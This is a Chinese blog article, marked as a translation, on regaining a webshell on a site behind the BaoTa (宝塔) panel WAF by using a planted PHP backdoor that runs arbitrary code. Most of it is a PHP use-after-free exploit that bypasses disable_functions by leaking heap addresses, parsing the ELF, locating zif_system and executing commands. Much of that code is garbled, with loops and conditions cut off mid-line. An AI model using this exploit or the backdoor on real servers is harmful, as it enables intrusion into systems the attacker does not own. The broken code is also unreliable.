# 绕过宝塔Getshell
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
朋友丢过来一个站，说站点的webshell掉了，并且上了宝塔，但是后门还在，由于宝塔的原因迟迟无法再次getshell。正好不在乙方工作多年，好久没遇到WAF对抗了，就要过来看看。
## Bypass 宝塔
###  disable_function拦截
首先当看到朋友给的后门数据包时有点懵，以为是什么漏洞，先放到burp里看看：
这下明白他一开始给的代码的意思了，是一个后门，接收content的值放到php代码里，相当于一个可以执行任意php代码的后门，他给的数据包就是接收b和d的值去执行。但是根据上面的报错，也能看出出现了两个`= 0; $j--) {
                $address >= 8;
            }
            return $out;
        }
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i >= 8;
            }
        }
        function leak($addr, $p = 0, $s = 8) {
            global $abc, $helper;
            write($abc, 0x68, $addr + $p - 0x10);
            $leak = strlen($helper->a);
            if($s != 8) { $leak %= 2  0 && $leak - $base  0 && $leak - $base chtg = $this->ryat;
                $this->ryat = 1;
            }
        }
        class Helper {
            public $a, $b, $c, $d;
        }
        if(stristr(PHP_OS, 'WIN')) {
            die('This PoC is for *nix systems only.');
        }
        $n_alloc = 10; # increase this value if you get segfaults
        $contiguous = [];
        for($i = 0; $i b = function ($x) { };
        if(strlen($abc) == 79 || strlen($abc) == 0) {
            die("UAF failed");
        }
        # leaks
        $closure_handlers = str2ptr($abc, 0);
        $php_heap = str2ptr($abc, 0x58);
        $abc_addr = $php_heap - 0xc8;
        # fake value
        write($abc, 0x60, 2);
        write($abc, 0x70, 6);
        # fake reference
        write($abc, 0x10, $abc_addr + 0x60);
        write($abc, 0x18, 0xa);
        $closure_obj = str2ptr($abc, 0x20);
        $binary_leak = leak($closure_handlers, 8);
        if(!($base = get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }
        if(!($elf = parse_elf($base))) {
            die("Couldn't parse ELF header");
        }
        if(!($basic_funcs = get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }
        if(!($zif_system = get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        # fake closure object
        $fake_obj_offset = 0xd0;
        for($i = 0; $i b)($cmd);
        exit();
    }
最终也成功的执行了命令：
## 总结
本文介绍了在有代码执行漏洞（后门）的情况下，通过多个技术手段绕过宝塔达到了写入webshell和执行命令的目的。现在网站大多数都接入了WAF，如何绕过WAF是个需要长期思考的问题。